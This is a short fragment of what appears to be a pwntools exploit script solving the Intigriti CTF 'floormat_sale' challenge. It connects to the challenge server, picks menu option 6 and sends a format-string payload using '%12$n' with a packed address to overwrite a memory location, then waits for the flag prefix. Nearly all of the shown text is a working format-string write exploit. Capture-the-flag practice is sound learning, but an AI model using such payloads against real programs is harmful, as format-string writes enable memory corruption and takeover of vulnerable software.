...
_path = "./floormat_sale_patched"
exe = context.binary = ELF(_path, checksec=False)
#libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = 'floormatsale.ctf.intigriti.io'
port = 1339
cmd = f'''
...
def main():
    ...
    _sendline(b'Enter your choice:', b'6')
    payload = b'a' * (0x10 - 5) + b'%12$n' + p(0x40408C)
    _sendline(b'Please enter your shipping address:', payload)
    chall.recvuntil(b'INTI')
